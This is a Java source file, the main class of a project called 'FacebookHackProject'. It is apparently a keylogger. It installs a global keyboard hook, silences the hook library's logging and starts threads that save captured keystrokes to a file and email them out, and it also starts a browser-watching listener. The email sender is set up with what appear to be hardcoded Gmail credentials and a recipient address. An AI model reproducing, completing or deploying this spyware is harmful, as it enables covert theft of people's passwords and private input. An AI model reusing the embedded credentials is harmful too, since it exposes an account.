/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package facebookhackproject;

import facebookhackproject.pushers.EmailPusher;
import facebookhackproject.pushers.FilePusher;
import facebookhackproject.pushers.Pusher;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

/**
 *
 * @author Kareem
 */
public class FacebookHackProject {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        // Clear previous logging configurations.
        LogManager.getLogManager().reset();

        // Get the logger for "org.jnativehook" and set the level to off.
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        ArrayList<Pusher> pushers = new ArrayList();
        pushers.add(new FilePusher());
        pushers.add(new EmailPusher("kareem3d.a@gmail.com", "friends91", "Mr.Elazony@gmail.com"));
        
        // Run pushers threads
        pushers.stream().forEach((pusher) -> {
            new Thread(pusher).start();
        });

        GlobalKeyListener listener = new GlobalKeyListener(pushers);
        GlobalScreen.addNativeKeyListener(listener);

        new Thread(new WebBrowserListener(listener)).start();
    }
}
